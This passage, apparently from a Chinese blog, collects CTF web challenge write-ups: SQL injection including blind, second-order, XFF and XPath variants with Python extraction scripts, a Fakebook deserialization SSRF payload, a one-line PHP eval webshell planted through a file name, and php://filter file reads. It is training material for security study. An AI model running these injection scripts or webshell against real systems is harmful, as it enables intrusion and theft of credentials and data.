__name__ == &#x27;__main__&#x27;: main() 最后跑出了一个源代码，进行审计。 既然是MVC架构，先弄清楚路由 12345678910111213141516171819202122232425262728if(!empty($_REQUEST[&#x27;r&#x27;]))&#123; $r = explode(&#x27;/&#x27;, $_REQUEST[&#x27;r&#x27;]); list($controller,$action) = $r; $controller = &quot;&#123;$controller&#125;Controller&quot;; $action = &quot;action&#123;$action&#125;&quot;; if(class_exists($controller)) &#123; if(method_exists($controller,$action)) &#123; // &#125; else &#123; $action = &quot;actionIndex&quot;; &#125; &#125; else &#123; $controller = &quot;LoginController&quot;; $action = &quot;actionIndex&quot;; &#125; $data = call_user_func(array( (new $controller), $action));&#125; else &#123; header(&quot;Location:index.php?r=Login/Index&quot;);&#125; 从r参数中获取要访问的Controller以及Action,然后以/分隔开后拼接成完整的控制器名。以Login/Index为例，就是将Login/Index分隔开分别拼接成LoginController以及actionIndex,然后调用LoginController这个类中的actionIndex方法。每个action里面会调用对应的loadView()方法进行模版渲染，然后将页面返回给客户端。若访问的Controller不存在则默认解析Login/Index。 下面看关键代码： 123456789public function loadView($viewName =&#x27;&#x27;, $viewData = [])&#123; $this-&gt;viewPath = BASE_PATH . &quot;/View/&#123;$viewName&#125;.php&quot;; if(file_exists($this-&gt;viewPath)) &#123; extract($viewData); include $this-&gt;viewPath; &#125;&#125; 很明显可以通过extract来覆盖变量，不过现在还不知道需要覆盖什么变量，寻找几个调用loadView的方法，发现一个对$viewData完全可控的地方。 12345public function actionIndex()&#123; $listData = $_REQUEST; $this-&gt;loadView(&#x27;userIndex&#x27;,$listData);&#125; $listData是从REQUEST提取出来的，完全可控。而其对应的/View/userIndex.php中存在一个文件读取。 123456 if(!isset($img_file)) &#123; $img_file = &#x27;/../favicon.ico&#x27;; &#125;$img_dir = dirname(__FILE__) . $img_file;$img_base64 = imgToBase64($img_dir);echo &#x27;&lt;img src=&quot;&#x27; . $img_base64 . &#x27;&quot;&gt;&#x27;; 这样，$img_file可通过extract($viewData)变量覆盖漏洞完全控制，而$viewData是受用户控制的完全控制的。所以这里就存在一个任意文件读取漏洞。 所以访问?r=User/Index&amp;img_file=/../flag.php可直接获取flag.php经base64后的内容。 强网杯2019 Fakebook 考点 源码泄露 SQL注入 PHP反序列化 SSRF 题解 有robots.txt 12User-agent: *Disallow: &#x2F;user.php.bak 访问一下拿到源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpclass UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); &#125;&#125;?&gt; 第一眼看上去就很像是SSRF漏洞利用，但是始终绕不过isValidBlog函数中的正则表达式 走一下网站的流程 注册了账号 访问个人界面时 1http:&#x2F;&#x2F;111.198.29.45:53095&#x2F;view.php?no&#x3D;1 输入no=9 有报错信息，泄露了目录 1Notice: Trying to get property of non-object in &#x2F;var&#x2F;www&#x2F;html&#x2F;view.php on line 53 看一下有没有sql注入，手工注失败了，有waf。 看了一下师傅们的wp,发现是waf把union select给过滤了，用/**/内联注释来绕过。 123456#爆表no&#x3D;-1+union&#x2F;**&#x2F;select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema&#x3D;database() #爆列no&#x3D;-1+union&#x2F;**&#x2F;select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema&#x3D;database()#爆列data的内容no&#x3D;-1+union&#x2F;**&#x2F;select 1,group_concat(data),3,4 from users data里的内容就是我们之前注册用户的序列化数据，报错信息暗示我们需要构造一个序列化对象 1unserialize(): Error at offset 0 of 1 bytes in &lt;b&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;view.php&lt;&#x2F;b&gt; on line 31 这里提交了一个no的参数，返回了用户信息这个页面，所以不难猜到服务器端是通过分析no参数，再从数据库中进行查询，然后返回我们的信息，之前sql注入时得到了服务器再查询时是查询了4个字段，而我们得到的可用的字段有[no,username,passwd,data]四个字段。 毋庸置疑的是我们的注册信息是写入了数据库的，而no,username,passwd三个字段均没有我们注册时候填写的blog地址，只有data字段中有一个序列化后的blog属性的值。那么返回的页面中的bolg地址是怎么查询的? 或者说怎么得到的？就是通过查询data字段,得到其中的序列化信息来渲染整个页面，从而恰好得到页面中的username,age,blog值。 猜想到这个逻辑之后,我们就可以通过修改查询的序列化对象的值来构造ssrf请求,从而读取到flag文件 利用前面泄露的源码构造一个恶意对象 12345678910&lt;?phpclass UserInfo &#123; public $name = &quot;admin&quot;; public $age = 233; public $blog = &quot;file:///var/www/html/flag.php&quot;;&#125;$data = new UserInfo();echo serialize($data);?&gt; 利用getBlogContents调用的curl进行SSRF攻击，四个参数都试了一下，发现是第4个用来读用户数据的： 1payload&#x3D;?no&#x3D;-1 union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39; 在iframe中得到flag。 非预期解 源码没有过滤load_file函数，可以直接包含一个文件： 1?no&#x3D;0+unIon&#x2F;**&#x2F;select+1,load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&#39;),1,1 load_file使用条件： 1.用户有很高的权限 2.知道文件的绝对路径 BJDCTF 2nd 简单注入 考点 MySQL盲注 Python脚本编写 解题 访问robots.txt页面提示有hint.php： 1234Only u input the correct password then u can get the flagand p3rh4ps wants a girl friend.select * from users where username&#x3D;&#39;$_POST[&quot;username&quot;]&#39; and password&#x3D;&#39;$_POST[&quot;password&quot;]&#39;; fuzz一下发现：空格单双引号过滤，\\没过滤，如果未对$_POST[&quot;username&quot;]进行其他限制，那么可以使用反斜杠将第二个单引号转义，此时第一个单引号和第三个单引号构成语句：username='xxxxx', $_POST[&quot;password&quot;]则可进行盲注。 username=admin\\ password=or/**/length(database())&gt;0#回显BJD needs to be stronger username=admin\\ password=or/**/length(database())&lt;0#回显You konw ,P3rh4ps needs a girl friend 写盲注脚本 1234567891011121314151617181920212223242526272829303132import requestsfrom time import sleepurl = &#x27;http://2cfb1e37-5400-4888-895d-bd5db365a250.node3.buuoj.cn/index.php&#x27;data = &#123; &#x27;username&#x27;: &#x27;admin\\\\&#x27;, &#x27;password&#x27;: &#x27;&#x27;&#125;flag = &#x27;BJD needs to be stronger&#x27;result = &#x27;&#x27;for i in range(1, 50): sleep(0.5) high = 127 low = 32 while high &gt; low: mid = (high + low) // 2 payload = &quot;or/**/if(ascii(substr(password,%d,1))&gt;%d,1,0)#&quot; % (i, mid) data[&#x27;password&#x27;] = payload rs = requests.post(url=url, data=data) if flag in rs.text: low = mid + 1 else: high = mid if low != 32: result += chr(low) else: break print(result) 得到password:OhyOuFOuNdit SWPUCTF2019 Web1 考点 二次注入 MySQL无列名注入 MySQL5.7+ 新特性 知识储备 无列名注入主要是适用于已经获取到数据表，但无法查询列的情况下，在CTF题目中常常是因为information_schema被过滤的情况下，使用这种方法获取列名。 无列名注入的原理其实类似于将我们不知道的列名，进行取别名操作，在取别名的同时进行数据查询，所以如果我们查询的字段多于数据表中列的时候，会出现报错。 在 information_schema 中，除了 SCHEMATA、TABLES、COLUMNS 有表信息外，高版本的 mysql 5.7以上，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。 例如当前有一个user表 发现该数据表中有3列，我们使用无列名查询的方式尝试查询一下 尝试多一个字段或者少一个字段进行查询： 仍然报错，证明无列名注入必须一一对应所查询数据表的列数。 对一列数据进行查询： 末尾的 a 可以是任意字符，用于命名。 当然，多数情况下，` 会被过滤。当 ` 不能使用的时候，使用别名来代替： 同时查询多个列： 解题 注册admin的时候提示用户已经存在，那么就随便注册一个用户名，登录后发表广告，点击查看详情页，第一反应看url传入了id字段，经过测试后，id字段不存在SQL注入。 再考虑是不是二次注入，发表广告后，查询广告详情的时候产生注入。 测试注入点： 点击广告详情 发现数据库报错信息，证明存在注入，可根据报错的信息去构造sql注入语句，fuzz一下被过滤的字符和符号。 发现空格，or，#，–+等被过滤，我们使用注释符号来代替空格。报错过滤了extractvalue 和 updatexml，于是考虑用 union 联合注入。 尝试闭合单引号： 1aaa&#39;,&#39; 先判断字段的个数，or被过滤了不能用order by，但是可以用group by来替换 111&#39;&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;22,&#39; 判断回显位 111&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39; 查询一下数据库名称和版本 111&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39; 由于or被过滤，所以不能用information_schema，但是根据上面的知识储备，如果数据表的引擎是innodb， 还可以用mysql.innodb_table_stats获取表名 https://mariadb.com/kb/en/mysqlinnodb_table_stats/ 111&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39; 我们无法知道列名，可以通过无列名注入的方式进行注入，先查询users表。 111&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39; 后记 如果过滤了逗号，可以用join关键字连接 12345678910mysql&gt; select * from users union select * from (select 1)a join (select 2)b join (select 3)c;+----+----------+------------+| id | username | password |+----+----------+------------+| 1 | Dumb | Dumb || 2 | Angelina | I-kill-you || 3 | Dummy | p@ssword || 1 | 2 | 3 |+----+----------+------------+4 rows in set (0.00 sec) 网鼎杯2018 comment 考点 Git源码恢复 代码审计 二次注入 解题 上来没什么思路，先用dirmap扫一遍发现Git文件夹，用GitHack把源码dump下来，只有一个write_do.php文件，并且不完整，需要查看提交历史。因为lijiejie的GitHack不能把.git文件夹同时dump下来，所以这里换成wangyihang的GitHacker。 查看第一个commit 12$ git reset --hard e5b2a2443c2b6d395d06960123142bc91123148cHEAD 现在位于 e5b2a24 WIP on master: bfbdf21 add write_do.php 得到write_do.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#x27;login&#x27;] != &#x27;yes&#x27;)&#123; header(&quot;Location: ./login.php&quot;); die();&#125;if(isset($_GET[&#x27;do&#x27;]))&#123;switch ($_GET[&#x27;do&#x27;])&#123;case &#x27;write&#x27;: $category = addslashes($_POST[&#x27;category&#x27;]); $title = addslashes($_POST[&#x27;title&#x27;]); $content = addslashes($_POST[&#x27;content&#x27;]); $sql = &quot;insert into board set category = &#x27;$category&#x27;, title = &#x27;$title&#x27;, content = &#x27;$content&#x27;&quot;; $result = mysql_query($sql); header(&quot;Location: ./index.php&quot;); break;case &#x27;comment&#x27;: $bo_id = addslashes($_POST[&#x27;bo_id&#x27;]); $sql = &quot;select category from board where id=&#x27;$bo_id&#x27;&quot;; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num&gt;0)&#123; $category = mysql_fetch_array($result)[&#x27;category&#x27;]; $content = addslashes($_POST[&#x27;content&#x27;]); $sql = &quot;insert into comment set category = &#x27;$category&#x27;, content = &#x27;$content&#x27;, bo_id = &#x27;$bo_id&#x27;&quot;; $result = mysql_query($sql); &#125; header(&quot;Location: ./comment.php?id=$bo_id&quot;); break;default: header(&quot;Location: ./index.php&quot;);&#125;&#125;else&#123; header(&quot;Location: ./index.php&quot;);&#125;?&gt; 提交评论还需要登录，根据登录框上的place_hold，应该是要爆破密码的后三位，写一个python脚本跑一下就出来，代码写太烂不贴了：zhangwei/zhangwei666 接着审计源码，可以看到上面第12-14行都对 POST 传来category 、 title 、content三个参数进行了特殊字符转义，然而在第28行和第30-33行处直接将从数据库中取出的数据，未经任何过滤拼接到SQL语句 中，并且content的值会显示在页面上，这就存在二次注入 。 addslashes会将传入的信息都会进行转义，但是数据库会自动清除反斜杠。 下面说说二次注入的攻击过程： 先进入 write 方法，将payload： ',content=database(),/* 插入 board 表的 category 字段中 此时payload为title=111&amp;category=',content=database(),/*&amp;content=1 再进入 comment 方法，程序将 board 表中的 category 字段取出，没进行过滤，拼接到新的 insert 语句中。由于我们之前的 payload 中带有 /* ，所以我们需要闭合它，即我们在评论处提交 */# (对应 content 变量的值)，用于闭合/* 然后程序执行第二个SQL语句，并将用户提交的content值显示出来，而我们的 payload ： ',content=user(),/* 就会显示出当前用户。 查看当前用户 如果是root用户，一般 flag 就不会在数据库里面(因为如果在数据库中，不需要这么高的权限，实际也确实没有。 应该是要用SQL语句读取flag文件了。 先用/etc/passwd做一个验证 有一个www用户，查看他的历史命令 可以发现他删除了一个.DS_Store文件，但是还存在于/tmp/html目录中，由于这个文件有很多不可见字符不能直接用编辑器打开，先对其进行16进制编码 再转换成ASCII flag文件名flag_8946e1ff1ee3e40f.php 再解码就可以得到flag。 CISCN2019 easyweb 考点 源码泄露 MySQL盲注 PHP短标签 解题 又是一道盲注的题目，还是没有做出来。。。。。 robots.txt提示有bak备份文件，尝试了index.php.bak和user.php.bak无果后用dirmap扫描，发现了image.php.bak 123456789101112131415161718&lt;?phpinclude &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path); 基本思路：bool盲注，语句成功的话，就让id = 1，回显正常，错误的话 id = 0，就什么都没有。 单引号逃逸的方法是用\\0来转义掉它的单引号。输入\\0，经过addslashes函数会先变成\\\\0,然后经过“str_replace”函数，会变成\\,这样，就把id后面的单引号给转义了。 SQL盲注脚本： 12345678910111213141516171819202122232425262728import requestsfrom time import sleepurl = &quot;http://143e2c2b-3448-4468-aeee-95cd35c73be0.node3.buuoj.cn/image.php?id=\\\\0&amp;path=&quot;#payload = &quot;or id=if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;#payload = &quot;or id=if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;#payload = &quot;or id=if(ascii(substr((select username from users),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;payload = &quot;or id=if(ascii(substr((select password from users),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;flag = &quot;JFIF&quot;result = &quot;&quot;for i in range(1, 100): sleep(0.5) low = 32 high = 127 while high &gt; low: mid = (high + low) &gt;&gt; 1 response = requests.get(url + payload.format(i, mid)) if flag in response.text: low = mid + 1 else: high = mid if low != 32: result += chr(low) else: break print(result) 登录后是一个文件上传的功能，经过测试后可以发现，upload.php把上传的文件名写入了一个php文件后缀的日志文件，并且路径已知。但是文件名会过滤php，可以用短标签绕过。 1filename&#x3D;&lt;?&#x3D;@eval($_POST[&#39;a&#39;]);?&gt; 然后蚁剑直接连接。 WUSTCTF2020 颜值成绩查询 考点 MySQL盲注 解题 比较明显的GET型的SQL注入，FUZZ一下 发现好像是可以直接执行SQL语句，验证一下 接下来就是直接写盲注脚本了 12345678910111213141516171819202122232425import requestsurl = &quot;http://a55db98c-72b1-40e8-b771-61b1bc60cd9d.node3.buuoj.cn/?stunum=&quot;flag = &quot;Hi admin, your score is: 100&quot;result = &quot;&quot;for i in range(1, 100): low = 32 high = 127 while high &gt; low: mid = (high + low) &gt;&gt; 1 #payload = &quot;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;ctf&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)&quot; #payload = &quot;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;flag&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)&quot; payload = &quot;if(ascii(substr((select(group_concat(flag,0x3a,value))from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)&quot; response = requests.post(url+payload.format(i, mid)) if flag in response.text: low = mid + 1 else: high = mid if low != 32: result += chr(low) else: break print(result) 拓展 我们再吹毛求疵一点，上一个脚本跑出来的flag都是大写字母，那么我们应该如何区分大小写呢。 参考中的第二篇文章已经告诉了我们答案，想办法把字符串转换为二进制后，进行字节对字节的比较。但是函数BINARY中的in被禁掉了，作者又发现了一种思路，当一个字符串连接一个二进制的值时CONCAT(&quot;aa&quot;, BINARY(&quot;BB&quot;))，其得到的也将是二进制。 并且MySQL中的JSON对象是二进制对象，因此，CAST(0 AS JSON)会返回一个二进制字符串，进而SELECT CONCAT(“A”, CAST(0 AS JSON))也会返回一个二进制字符串。 所以我们看一看下面这个payload能否可行： 12||(select 1,concat(&#39;&#123;&#125;&#39;,cast(&#39;0&#39; as json)))&gt;(select * from f1ag_1s_h3r3_hhhhh) 返回了error。我猜应该是版本的问题，用第一个盲注脚本查看一下version()，发现是MariaDB 10.2.26。 查询一下官方文档，MariaDB在10.2.7才加入了JSON数据类型。 无果。 参考 https://www.gem-love.com/ctf/1782.html https://nosec.org/home/detail/3830.html RoarCTF2019 Online Proxy 考点 XFF注入 二次注入 盲注 题解 这道题的注入点在X-Forwarded-For，利用XFF来更改IP地址，可以发现IP被保存并输出了。 既然他的last-ip和current-ip会更新，由此可以猜想他与数据库进行了交互 1INSERT INTO table_name (current-ip,last-ip ) VALUES (&#x27;$current-ip&#x27;,&#x27;$last-ip&#x27; ); 由于这题有回显，因此，可以考虑二次注入。 首先用下面这个payload验证一下能不能成功地闭合语句： 10&#39; or ascii(substr((select(database())),1,1))&gt;100 or &#39;0 再随便输入 再次发送请求 验证成功，接下来就是写盲注脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import requestsurl = &quot;http://node3.buuoj.cn:29354/&quot;# 这个head头好像必须加cookiehead = &#123; &quot;X-Forwarded-For&quot;: &quot;&quot;, &quot;Cookie&quot;: &quot;track_uuid=60661451-cdab-4a74-95b4-74d6a66945a9&quot;&#125;# #查库名# payload = &quot;0&#x27; or ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;# #查表名# payload = &quot;0&#x27; or ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;F4l9_D4t4B45e&#x27;)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;# #查列名# payload = &quot;0&#x27; or ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F4l9_t4b1e&#x27;)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;# 查flagpayload = &quot;0&#x27; or ascii(substr((select(group_concat(F4l9_C01uMn))from(F4l9_D4t4B45e.F4l9_t4b1e)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;flag = &quot;&quot;for i in range(1, 1000): low = 32 high = 137 mid = (low + high) // 2 while low &lt; high: &#x27;&#x27;&#x27;插入sql语句&#x27;&#x27;&#x27; payload1 = payload.format(i, mid) head[&quot;X-Forwarded-For&quot;] = payload1 requests.get(url, headers=head) &#x27;&#x27;&#x27;重新发送两次请求&#x27;&#x27;&#x27; head[&quot;X-Forwarded-For&quot;] = &quot;penson&quot; requests.get(url, headers=head) r = requests.get(url, headers=head) if &quot;Last Ip: 1 &quot; in r.text: low = mid + 1 else: high = mid mid = (low + high) // 2 if mid == 32 or mid == 127: break flag += chr(mid) print(flag)print(flag) 拓展 更多的闭合方式 1234567&#39; or (payload) or &#39;&#39; and (payload) and &#39;&#39; or (payload) and &#39;&#39; or (payload) and &#39;&#x3D;&#39;&#39;* (payload) *&#39;&#39; or (payload) and &#39;&quot; – (payload) – &quot; 还有一种payload 10&#39;+conv(hex(substr((select database()),1,5)),16,10)+&#39;0 注意：一次不能读太多位，不然10进制会用科学计数法表示，就无法转换回原字符串了。 网鼎杯2018 Unfinished 考点 二次注入 两次Hex编码 解题 登陆的时候用到的是邮箱和密码，而注册的时候还有一个用户名，而这个用户名却在登陆后显示了，所以我们考虑用户名这里可能存在 二次注入。 注册成功，会得到 302 状态码并跳转至 login.php ；如果注册失败，只会返回 200 状态码。所以构造 payload 如下： 1email&#x3D;test@666.com&amp;username&#x3D;0&#39;%2B(select hex(hex(database())))%2B&#39;0&amp;password&#x3D;test 在这里解释一下为什么要两次hex加密： 上面这张图展示的是，如果字符串hex后的值中包含字母，在与0相加后只能显示字母之前的数字与0相加的结果。两次hex编码可以解决这个问题。 然后这里还要注意一个问题，就是当数据进过 两次hex 后，会得到较长的一串只含有数字的字符串，当这个长字符串转成数字型数据的时候会变成科学计数法，就无法还原本身的字符串。 所以这里我们使用 substr 每次取10个字符长度与 ‘0’ 相加，这样就不会丢失数据。但是这里使用逗号 , 会出错，所以可以使用类似 substr(‘test’ from 1 for 10) 这种写法来绕过，具体获取 flag 的payload如下： 10&#39;%2b(select substr(hex(hex((select * from flag))) from 1 for 10))%2b&#39;0 注入脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344# coding=utf-8import requestsimport re, binasciiimport sysurl = &quot;http://7fb57b69-428d-4c33-8988-d08449ffb183.node3.buuoj.cn/&quot;sql = &quot;select * from flag&quot;email = [&quot;test0&quot; + str(i) + &quot;@aa.aa&quot; for i in range(0, 24)] # 这里次数可以通过sql爆破flag长度得到，或者也可fuzzdef register(email, offset): payload = &quot;0&#x27;+(select substr(hex(hex((&#123;0&#125;))) from &#123;1&#125; for 10))+&#x27;0&quot;.format(sql, str(1 + offset * 10)) data = &#123; &quot;email&quot;: email, &quot;username&quot;: payload, &quot;password&quot;: &quot;test&quot; &#125; req = requests.post(url + &quot;/register.php&quot;, data=data)def login(email): data = &#123; &quot;email&quot;: email, &quot;password&quot;: &quot;test&quot; &#125; r = requests.post(url + &quot;/login.php&quot;, data, allow_redirects=True) pattern = &#x27;&lt;span class=\\&quot;user-name\\&quot;&gt;\\s*(\\d&#123;1,10&#125;)\\s*&lt;&#x27; return re.findall(pattern, r.text)[0]if __name__ == &#x27;__main__&#x27;: raw = &#x27;&#x27; for email, offset in zip(email, range(0, len(email))): register(email, offset) test = login(email) print(test) raw += test sys.stdout.write(&quot;[-] Double Hex : -&gt; %s &lt;-\\r&quot; % (raw)) sys.stdout.flush() print(&quot;[+] Double Hex : -&gt; &#123;&#125; &lt;-&quot;.format(raw)) BlackWatch 入群题 Web 考点 MySQL盲注 解题 盲注脚本： 12345678910111213141516171819202122232425262728import requestsurl = &quot;http://0b5ee7e6-71d1-4280-9dd3-6e27f0650b68.node3.buuoj.cn/backend/content_detail.php?id=&quot;proxies = &#123; &quot;http&quot;: None, &quot;https&quot;: None&#125;name = &quot;&quot;i = 0while True: head = 32 tail = 127 i += 1 while head &lt; tail: mid = head + tail &gt;&gt; 1 # payload = &quot;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d,3,2)&quot; % (i, mid) # payload = &quot;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;contents&#x27;)),%d,1))&gt;%d,3,2)&quot; % (i, mid) payload = &quot;if(ascii(substr((select(group_concat(password))from(admin)),%d,1))&gt;%d,3,2)&quot; % (i, mid) r = requests.get(url + payload, proxies=proxies) # print(url+payload) # print(r.json()) if &quot;Yunen&quot; in str(r.json()): head = mid + 1 else: tail = mid if head != 32: name += chr(head) print(name) else: break NPUCTF2020 ezlogin 考点 Xpath注入 解题 payload 含义 ’ or count(/)=1 or '1 判断有几个根节点 ’ or string-count(name(/*[1]))=1 or '1 获取根节点长度 'or substring(name(/*[1]), 1, 1)=‘a’ or '1 获取内容 盲注脚本 12345678910111213141516171819202122232425262728293031323334353637# -*- coding: UTF-8 -*-import requestsimport reimport stringimport timeurl = &#x27;http://90cceea4-fbed-4c2b-97de-a43474dea042.node3.buuoj.cn/login.php&#x27;sess = requests.session()strs = string.digits + string.ascii_lettersheaders = &#123; &#x27;Content-Type&#x27;: &#x27;application/xml&#x27;&#125;find = re.compile(&#x27;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*?)&quot; /&gt;&#x27;)result = &#x27;&#x27;for i in range(50): for j in strs: r = sess.post(url=url) token = find.findall(r.text) time.sleep(1) if token: # 根节点root # data = &quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i, j, token[0]) # root子节点accounts # data = &quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format( # accounts子节点user # data = &quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format( # user子节点id, username, password # data = &quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format( # data = &quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format( data = &quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format( i, j, token[0]) res = sess.get(url=url, headers=headers, data=data) if &#x27;非法操作&#x27; in res.text: result += j print(result) break 最后可以判断格式为： 123456789101112&lt;root&gt; &lt;accounts&gt; &lt;user&gt; &lt;id&gt;&lt;/id&gt; &lt;username&gt;gtfly123&lt;/username&gt; &lt;password&gt;e10adc3949ba59abbe56e057f20f883e&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;id&gt;&lt;/id&gt; &lt;username&gt;adm1n&lt;/username&gt; &lt;password&gt;cf7414b5bdb2e65ee43083f4ddbc4d9f&lt;/password&gt; &lt;/user&gt; password无法解密，使用adm1n gtfly123登录站点。 查看网页源代码，提示：flag is in /flag 存在文件包含，使用大小写绕过 1admin.php?file&#x3D;PHP:&#x2F;&#x2F;filter&#x2F;convert.BASE64-encode&#x2F;resource&#x3D;&#x2F;flag SUCTF2018 MultiSQL 考点 堆叠注入 MySQL预编译绕过 解题 首先来演示一下MySQL预编译 set set 的作用就是定义一个变量，变量的命名必须是@开头。 prepare和execute prepare语句用于预定义一个语句，并可以指定预定义语句名称。execute则是执行预定义语句。 123prepare prepare_name from “sql语句”execute prepare_name 结合起来利用就是： 1234567891011121314MariaDB [(none)]&gt; set @a&#x3D;&#39;select version()&#39;;Query OK, 0 rows affected (0.00 sec)MariaDB [(none)]&gt; prepare t from @a;Query OK, 0 rows affected (0.00 sec)Statement preparedMariaDB [(none)]&gt; execute t;+-----------+| version() |+-----------+| 8.0.20 |+-----------+1 row in set (0.00 